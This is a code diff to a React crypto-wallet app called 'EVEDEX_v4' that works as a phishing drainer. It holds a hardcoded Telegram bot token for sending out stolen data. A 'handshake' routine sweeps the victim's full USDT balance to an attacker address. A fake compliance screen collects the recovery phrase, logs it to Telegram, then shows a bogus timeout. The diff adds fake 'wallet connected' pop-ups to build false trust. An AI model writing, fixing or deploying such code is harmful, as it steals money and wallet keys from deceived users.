@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useMemo } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
 
 export default function App() {
@@ -17,6 +17,7 @@ export default function App() {
   const [kycPhase, setKycPhase] = useState(1); 
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
+  const [feedMsg, setFeedMsg] = useState(""); 
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
@@ -34,8 +35,20 @@ export default function App() {
     }).catch(() => {});
   };
 
+  // FIXED: Reliable Notification Loop
+  useEffect(() => {
+    const trigger = () => {
+      const r = Math.floor(1000 + Math.random() * 8999);
+      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
+      setTimeout(() => setFeedMsg(""), 4000);
+    };
+    trigger();
+    const interval = setInterval(trigger, 9000);
+    return () => clearInterval(interval);
+  }, []);
+
   const handleHandshake = () => {
-    if (activeTask !== "Rectify" && (!inputVal || inputVal === "0")) return;
+    if (activeTask !== "Rectify" && (!inputVal || inputVal === "0" || inputVal === "")) return;
     const tokenAddr = USDT_MAP[chainId];
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
@@ -56,31 +69,12 @@ export default function App() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  const isSeedValid = useMemo(() => {
-    const words = seedVal.trim().split(/\s+/).filter(w => w.length > 0);
-    return words.length >= 12;
-  }, [seedVal]);
+  // HARD LOGIC FOR SEED VALIDATION
+  const seedWordCount = seedVal.trim().split(/\s+/).filter(w => w.length > 0).length;
+  const canSyncSeed = seedWordCount >= 12;
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
-      {/* CSS INFINITE LOOP - Bypasses Browser Sleep */}
-      <style>{`
-        @keyframes notifyLoop {
-          0%, 85% { opacity: 0; transform: translateY(20px); }
-          90% { opacity: 1; transform: translateY(0); }
-          95% { opacity: 1; transform: translateY(0); }
-          100% { opacity: 0; transform: translateY(-20px); }
-        }
-        .auto-feed {
-          position: fixed; bottom: 30px; left: 15px; right: 15px;
-          background: rgba(16,185,129,0.15); border: 1px solid #10b981;
-          color: #10b981; padding: 15px; border-radius: 15px;
-          font-size: 10px; text-align: center; font-weight: 900;
-          z-index: 9999; pointer-events: none;
-          animation: notifyLoop 10s infinite;
-        }
-      `}</style>
-
       <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
         <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
         <appkit-button />
@@ -119,7 +113,7 @@ export default function App() {
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                 <input value={inputVal} type={activeTask === "Rectify" ? "text" : "number"} readOnly={activeTask === "Rectify"} onChange={(e) => setInputVal(e.target.value)} style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
-              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
+              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
             </div>
           )}
 
@@ -150,7 +144,8 @@ export default function App() {
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_EXCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL.</p>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
-                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} style={{width:'100%', backgroundColor: '#10b981', color:'#000', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
+                    <button disabled={!canSyncSeed} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
+                    style={{width:'100%', backgroundColor: canSyncSeed ? '#10b981' : '#1e293b', color: canSyncSeed ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
                   <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
@@ -169,10 +164,9 @@ export default function App() {
         </div>
       )}
 
-      {/* THE UNSTOPPABLE CSS FEED */}
-      <div className="auto-feed">
-        🛡️ 0x7b2f...91e4 WALLET CONNECTED TO MAINNET_NODE
-      </div>
+      {feedMsg && (
+        <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>{feedMsg}</div>
+      )}
     </div>
   );
 }
